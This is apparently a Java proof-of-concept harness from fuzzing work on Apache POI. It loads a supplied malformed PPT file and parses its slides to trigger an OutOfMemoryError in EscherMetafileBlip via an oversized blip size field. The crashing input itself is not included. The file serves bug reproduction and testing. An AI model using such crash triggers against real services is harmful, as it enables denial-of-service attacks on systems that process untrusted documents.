import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

import org.apache.poi.hslf.usermodel.HSLFSlideShow;

/**
 * PoC for POIHSLFFuzzer crash-b51c5d5ef25fe3e56b842ead216effc50fac9d26
 *
 * Vulnerability: OutOfMemoryError in EscherMetafileBlip.fillFields() via
 * IOUtils.safelyClone() with a huge blip size field, causing allocation of
 * a massive byte array. Triggered by opening a malformed PPT file.
 *
 * Expected crash: OutOfMemoryError (uncaught, propagated to JVM)
 *
 * Note: Run with -Xmx256m to reliably trigger the OOM.
 */
public class PoC {
    public static void main(String[] args) throws IOException {
        if (args.length < 1) {
            System.err.println("Usage: java PoC <crash.bin>");
            System.exit(1);
        }

        byte[] data = Files.readAllBytes(Paths.get(args[0]));

        try (InputStream is = new ByteArrayInputStream(data);
             HSLFSlideShow slideShow = new HSLFSlideShow(is)) {

            // Trigger slide extraction which forces EscherMetafileBlip parsing
            System.out.println("Slides: " + slideShow.getSlides().size());
            slideShow.getSlides().forEach(slide -> {
                System.out.println("Slide: " + slide.getTitle());
            });
        }
    }
}
